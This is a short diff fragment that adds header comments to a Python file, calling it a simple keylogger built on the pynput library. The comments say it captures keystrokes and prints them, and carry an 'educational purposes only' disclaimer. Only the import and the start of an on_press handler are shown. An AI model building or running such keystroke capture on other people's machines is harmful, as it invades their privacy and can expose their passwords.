@@ -1,3 +1,6 @@
+#This is a simple keylogger implementation in Python using the pynput library.
+#It captures keystrokes for a specified duration and prints them to the console. 
+#Note that this code is for educational purposes only and should not be used for malicious activities.
 from pynput import keyboard
 
 def on_press(key):
